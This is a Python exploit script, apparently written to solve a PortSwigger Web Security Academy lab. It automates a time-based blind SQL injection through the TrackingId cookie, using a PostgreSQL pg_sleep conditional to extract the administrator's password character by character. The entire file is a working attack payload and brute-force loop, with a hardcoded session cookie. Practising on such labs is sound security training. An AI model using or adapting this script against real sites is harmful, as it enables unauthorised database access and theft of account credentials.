#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

# vars
MAIN_URL="https://0a1300f203f94835831a33c1008a006a.web-security-academy.net"
CHARS=string.ascii_lowercase + string.digits

# functions
def def_handler(sig, frame):
    print("\nSaliendo...")
    sys.exit(1)

def make_req():
    password=""
    p1=log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")
    # time.sleep(2)
    p2=log.progress("Password")
    # p3=log.progress("Text")
    for i in range(1, 21):
        for char in CHARS:
            cookies = {
                "TrackingId": "KN6W4BY9L9YLZdT2'||(select case when substr(password,%d,1)='%s' then pg_sleep(1.5) else pg_sleep(0) end from users where username='administrator')-- -" % (i, char), 
                "session": "6GKFcHrKOCQqar7k66eu6W9kjhm2MTQK"
            }

            try:
                p1.status(cookies["TrackingId"])
                time_start = time.time()
                r=requests.get(MAIN_URL, cookies=cookies)
                time_end = time.time()
                # time.sleep(1)
                # p3.status(r.text)
                if time_end - time_start > 1.5:
                    password+=char
                    p2.status(password)
                    #print("Password:", password)
                    break
            
            except Exception as e:
                print("Error:", e)
                sys.exit(1)
    
    p1.success("Password encontrado: %s" % password)

# ctrl + c
signal.signal(signal.SIGINT, def_handler)

# main
if __name__ == "__main__":
    make_req()
    # time.sleep(10)